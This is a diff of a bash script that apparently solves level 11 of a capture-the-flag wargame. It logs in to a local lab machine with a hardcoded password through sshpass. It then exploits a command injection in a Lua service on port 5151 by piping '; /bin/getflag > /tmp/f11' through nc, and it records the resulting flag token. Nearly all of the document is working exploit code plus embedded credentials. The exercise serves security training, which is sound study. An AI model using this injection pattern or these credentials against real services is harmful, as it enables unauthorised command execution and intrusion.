@@ -1,16 +1,21 @@
-ls -la
+#!/bin/bash
 
-getfacl level11.lua
+ssh() {
+    sshpass -p 'feulo4b72j7edeahuete3no7c' ssh level11@localhost -p 2220 "$1"  
+}
 
-cat level11.lua
+ssh "ls -la"
 
+ssh "getfacl level11.lua"
 
-# local server = assert(socket.bind("127.0.0.1", 5151))
-# prog = io.popen("echo "..pass.." | sha1sum", "r") 
-echo [whatever the user typed] | sha1sum
+ssh "cat level11.lua"
 
-nc 127.0.0.1 5151
+ssh 'ps aux | grep lua'
 
-echo ; getflag > /tmp/flag | sha1sum
+ssh 'printf "; /bin/getflag > /tmp/f11\n" | nc 127.0.0.1 5151'
 
-#fa6v5ateaw21peobuub8ipe6s
+sleep 2
+
+ssh 'cat /tmp/f11'
+
+# Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
